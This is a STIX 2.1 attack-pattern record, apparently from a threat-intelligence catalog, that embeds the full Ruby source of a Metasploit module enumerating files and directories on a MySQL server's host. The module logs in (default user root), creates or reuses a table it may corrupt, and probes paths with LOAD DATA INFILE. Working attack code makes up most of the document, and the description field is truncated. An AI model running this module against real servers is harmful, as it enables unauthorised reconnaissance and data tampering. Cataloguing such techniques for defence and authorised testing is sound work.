{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c31a4038-4588-403b-8467-fb87d5db58c8",
    "created": "2024-08-14T16:31:20.937802Z",
    "modified": "2024-08-14T16:31:20.937806Z",
    "name": "MYSQL File/Directory Enumerator",
    "description": "Q Enumerate files and directories using the MySQL load_file feature, for more",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/mysql/mysql_file_enum.rb",
            "external_id": "mysql_file_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "http://pauldotcom.com/2013/01/mysql-file-system-enumeration.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.digininja.org/projects/mysql_file_enum.php"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'yaml'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MYSQL\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'MYSQL File/Directory Enumerator',\n      'Description'    => %Q{\n          Enumerate files and directories using the MySQL load_file feature, for more\n        information see the URL in the references.\n      },\n      'Author'         => [ 'Robin Wood <robin[at]digininja.org>' ],\n      'References'  => [\n        [ 'URL', 'http://pauldotcom.com/2013/01/mysql-file-system-enumeration.html' ],\n        [ 'URL', 'http://www.digininja.org/projects/mysql_file_enum.php' ]\n      ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options([\n      OptPath.new('FILE_LIST', [ true, \"List of directories to enumerate\", '' ]),\n      OptString.new('DATABASE_NAME', [ true, \"Name of database to use\", 'mysql' ]),\n      OptString.new('TABLE_NAME', [ true, \"Name of table to use - Warning, if the table already exists its contents will be corrupted\", Rex::Text.rand_text_alpha(8) ]),\n      OptString.new('USERNAME', [ true, 'The username to authenticate as', \"root\" ])\n    ])\n\n  end\n\n  # This function does not handle any errors, if you use this\n  # make sure you handle the errors yourself\n  def mysql_query_no_handle(sql)\n    res = @mysql_handle.query(sql)\n    res\n  end\n\n  def run_host(ip)\n    vprint_status(\"Login...\")\n\n    if (not mysql_login_datastore)\n      return\n    end\n\n    begin\n      mysql_query_no_handle(\"USE \" + datastore['DATABASE_NAME'])\n    rescue ::Mysql::Error => e\n      vprint_error(\"MySQL Error: #{e.class} #{e.to_s}\")\n      return\n    rescue Rex::ConnectionTimeout => e\n      vprint_error(\"Timeout: #{e.message}\")\n      return\n    end\n\n    res = mysql_query(\"SELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA = '\" + datastore['DATABASE_NAME'] + \"' AND TABLE_NAME = '\" + datastore['TABLE_NAME'] + \"';\")\n    table_exists = (res.size == 1)\n\n    if !table_exists\n      vprint_status(\"Table doesn't exist so creating it\")\n      mysql_query(\"CREATE TABLE \" + datastore['TABLE_NAME'] + \" (brute int);\")\n    end\n\n    file = File.new(datastore['FILE_LIST'], \"r\")\n    file.each_line do |line|\n      check_dir(line.chomp)\n    end\n    file.close\n\n    if !table_exists\n      vprint_status(\"Cleaning up the temp table\")\n      mysql_query(\"DROP TABLE \" + datastore['TABLE_NAME'])\n    end\n  end\n\n  def check_dir dir\n    begin\n      res = mysql_query_no_handle(\"LOAD DATA INFILE '\" + dir + \"' INTO TABLE \" + datastore['TABLE_NAME'])\n    rescue ::Mysql::TextfileNotReadable\n      print_good(\"#{dir} is a directory and exists\")\n      report_note(\n        :host  => rhost,\n        :type  => \"filesystem.dir\",\n        :data  => \"#{dir} is a directory and exists\",\n        :port  => rport,\n        :proto => 'tcp',\n        :update => :unique_data\n      )\n    rescue ::Mysql::DataTooLong, ::Mysql::TruncatedWrongValueForField\n      print_good(\"#{dir} is a file and exists\")\n      report_note(\n        :host  => rhost,\n        :type  => \"filesystem.file\",\n        :data  => \"#{dir} is a file and exists\",\n        :port  => rport,\n        :proto => 'tcp',\n        :update => :unique_data\n      )\n    rescue ::Mysql::ServerError\n      vprint_warning(\"#{dir} does not exist\")\n    rescue ::Mysql::Error => e\n      vprint_error(\"MySQL Error: #{e.class} #{e.to_s}\")\n      return\n    rescue Rex::ConnectionTimeout => e\n      vprint_error(\"Timeout: #{e.message}\")\n      return\n    else\n      print_good(\"#{dir} is a file and exists\")\n      report_note(\n        :host  => rhost,\n        :type  => \"filesystem.file\",\n        :data  => \"#{dir} is a file and exists\",\n        :port  => rport,\n        :proto => 'tcp',\n        :update => :unique_data\n      )\n    end\n\n    return\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Robin Wood <robin[at]digininja.org> ]",
        ""
    ]
}